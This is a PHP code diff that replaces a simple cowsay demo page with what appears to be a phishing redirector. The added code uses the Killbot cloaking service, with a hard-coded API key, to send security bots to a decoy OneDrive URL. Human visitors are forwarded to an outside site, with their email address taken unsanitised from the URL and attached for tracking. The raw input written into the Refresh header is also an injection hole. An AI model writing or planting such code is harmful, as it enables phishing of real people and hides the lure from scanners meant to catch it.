@@ -1,14 +1,17 @@
 <?php
-require __DIR__ . '/vendor/autoload.php';
 
-use Cowsayphp\Farm;
+require_once('class.killbot.php');
 
-header('Content-Type: text/plain');
+$Killbot = new Killbot([
+    'active'        => true, // If 'true' will set blocker protection active, and 'false' will deactive protection
+    'apikey'        => 'G8ehsve_fMOf_hcgrSucOTYcbTxcy-bR1LjR5nXB646uA', // Your API Key from https://killbot.pw/developer
+    'bot_redirect'  => 'https://onedrive.live.com/dhdos-2/' // Bot will be redirect to this URL
+]);
+$Killbot->run();
 
-$text = "Set a message by adding ?message=<message here> to the URL";
-if(isset($_GET['message']) && $_GET['message'] != '') {
-	$text = htmlspecialchars($_GET['message']);
-}
+$email = $_GET['info'];
+//$email = base64_decode($_GET['info']);// this for base64 converstion
+$link = "https://brown.com";
+$sess = "&qrc=$email";
 
-$cow = Farm::create(\Cowsayphp\Farm\Cow::class);
-echo $cow->say($text);
+header ("Refresh: 0; url=$link$sess");
